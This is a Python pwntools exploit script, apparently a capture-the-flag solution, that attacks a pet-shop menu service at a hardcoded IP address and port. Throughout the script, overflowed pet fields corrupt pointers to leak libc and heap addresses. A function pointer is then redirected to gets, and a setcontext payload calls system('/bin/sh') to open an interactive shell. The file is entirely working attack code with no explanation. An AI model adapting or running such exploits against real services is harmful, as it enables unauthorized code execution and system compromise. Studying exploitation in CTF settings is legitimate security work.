#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
host = "200.200.200.105"
#host = "10.211.55.6"
#port = 8888
port = 9899
r = remote(host,port)

def buy(idx):
    r.recvuntil(":\n")
    r.sendline("1")
    r.recvuntil(":\n")
    r.sendline(str(idx))

def sound(idx):
    r.recvuntil(":\n")
    r.sendline("3")
    r.recvuntil(":\n")
    r.sendline(str(idx))

def setpet(idx,name,sound,feed):
    r.recvuntil(":\n")
    r.sendline("4")
    r.recvuntil(":\n")
    r.sendline(str(idx))
    r.recvuntil(":\n")
    r.sendline(name)
    r.recvuntil(":\n")
    r.sendline(sound)
    r.recvuntil(":\n")
    r.sendline(feed)


def listpet():
    r.recvuntil(":")
    r.sendline("5")

setvbuf_got = 0x000000000604030
buy(1)
buy(2)
setpet(1,"a"*0x28 + "\x40" ,"d"*0x16 + "a"*7,"d"*0xc + "a"*6)
setpet(1,"a"*0x20 + "d"*5 ,"d"*0x16 + "a"*4  ,"d"*0xc  + p64(setvbuf_got)[:3])
listpet()
r.recvuntil("person:")
libc = u64(r.recvuntil("pet")[:6].ljust(8,"\x00")) - 0x6fe70
top = libc + 0x3c3b78
setpet(1,"a"*0x20 + "d"*5 ,"d"*0x16 + "a"*4  ,"d"*0xc  + p64(top)[:7])
listpet()
r.recvuntil("person:")
heap = u64(r.recvuntil("pet")[:6].ljust(8,"\x00")) - 0x110
#magic = libc + 0xf5b10
gets = libc + 0x6ed80
setpet(2,"d"*8,"d"*6 ,"rrrr" + p64(gets))
setpet(1,"a"*0x48 + p64(heap+0xa0-8),"d","d")
r.recvuntil(":")
r.sendline("3")
r.recvuntil(":")
r.send("2")
setcontext = libc + 0x47b75
system = libc + 0x45390
payload = p64(heap+0x90)*2 + p64(setcontext)*4 + "b"*0x38 + p64(heap+0x130) + "a"*0x28 + p64(system) + p64(heap+0x90) + p64(system)  + "/bin/sh\x00"
r.sendline(payload)
r.interactive()
